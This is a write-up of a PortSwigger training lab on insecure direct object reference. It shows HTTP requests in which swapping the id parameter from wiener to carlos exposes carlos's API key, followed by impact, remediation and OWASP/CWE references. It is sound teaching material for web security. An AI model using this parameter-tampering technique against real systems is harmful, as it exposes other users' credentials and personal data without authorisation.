# User ID controlled by request parameter

**Category:** Access control / IDOR
**Level:** Apprentice
**Mechanism:** IDOR — horizontal privilege escalation via `id` parameter
**Lab URL:** https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter

---

## Vulnerability

The account page selects which user's data to return from a user-controlled `id`
parameter in the URL, and the server does not verify that the requested `id` matches
the authenticated session. Any logged-in user can therefore read another user's
account by changing `id` — an Insecure Direct Object Reference (IDOR) giving horizontal
privilege escalation.

## Reconnaissance & Exploitation

Logged in as `wiener:peter`, the account page loaded my own data from a request whose
URL carries my username in `id`:

```http
GET /my-account?id=wiener HTTP/2
Host: 0acf00d70467f927833f4cef007b0085.web-security-academy.net
Cookie: session=<redacted>
```

```http
HTTP/2 200 OK
...
Your username is: wiener
Your API Key is: ZnuCEnCBRxwwWTrLGoNZWGNQ7QS8PSVR
```

The `id` is a direct object reference with no ownership check. Sending the same
request (same `wiener` session) but changing `id=wiener` to `id=carlos` returned
carlos's account — including his API key:

```http
GET /my-account?id=carlos HTTP/2
Host: 0acf00d70467f927833f4cef007b0085.web-security-academy.net
Cookie: session=<redacted>
```

```http
HTTP/2 200 OK
...
Your username is: carlos
Your API Key is: kS3LiaDE3BZmGmVFBTAeBsCtDs6a0DHS
```

Submitting carlos's API key solved the lab. The server authenticated the session as
`wiener` but authorised the data purely on the `id` value, never checking the two
match.

## Impact

Any authenticated user can read any other user's account data by iterating the `id`
parameter — here leaking API keys, which are credentials for further access. At scale
this is a mass data breach: usernames are often guessable or enumerable, so an attacker
harvests every user's sensitive data (keys, tokens, PII) with a single parameter
change. Authentication worked; authorisation was absent.

## Remediation

- Enforce object-level authorisation on every access: derive the user from the session
  and verify they own (or may access) the requested `id` before returning data.
- Prefer deriving the account from the session directly (no `id` parameter at all) for
  "my account"–type pages, so there is nothing to tamper with.
- If references must be exposed, make them unpredictable (random GUIDs) as defence in
  depth — but this never replaces the server-side ownership check.

## References

- **OWASP:** A01:2021 Broken Access Control
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key); CWE-284 (Improper Access Control)

## Notes

- Signature pattern: any parameter that names a record (`id`, `user`, `account`,
  `order`) is an IDOR candidate — swap your value for another and see if the server
  checks ownership.
- Authentication ≠ authorisation. Being logged in is not permission to read a specific
  object; the server must check the session owns that object on every request.
- This is OWASP's #1 category and the single most common real-world finding — cheap to
  test, high impact.